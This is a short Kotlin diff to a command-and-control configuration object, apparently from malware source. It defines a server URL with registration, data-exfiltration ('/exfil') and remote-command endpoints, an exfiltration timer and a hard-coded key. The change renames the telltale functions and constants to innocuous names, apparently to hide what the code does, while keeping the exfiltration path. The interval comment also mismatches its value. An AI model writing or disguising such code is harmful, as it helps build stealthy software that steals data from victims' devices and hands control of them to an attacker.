@@ -60,25 +60,25 @@ object C2Config {
         }
     }
 
-    fun getServerUrl(): String {
+    fun getEndpoint(): String {
         return "http://$serverIp:$PORT"
     }
 
     fun getRegistrationEndpoint(): String {
-        return "${getServerUrl()}/register"
+        return "${getEndpoint()}/register"
     }
 
-    fun getExfiltrationEndpoint(): String {
-        return "${getServerUrl()}/exfil"
+    fun getUploadPath(): String {
+        return "${getEndpoint()}/exfil"
     }
 
     fun getCommandEndpoint(): String {
-        return "${getServerUrl()}/command"
+        return "${getEndpoint()}/command"
     }
 
     const val EXFIL_INTERVAL = 10 * 60 * 1000L  // 1 minute
 
-    const val ENCRYPTION_KEY = "ThisIsAFakeKey16"
+    const val SEC_KEY = "ThisIsAFakeKey16"
 
     fun getServerIp(): String {
         return serverIp
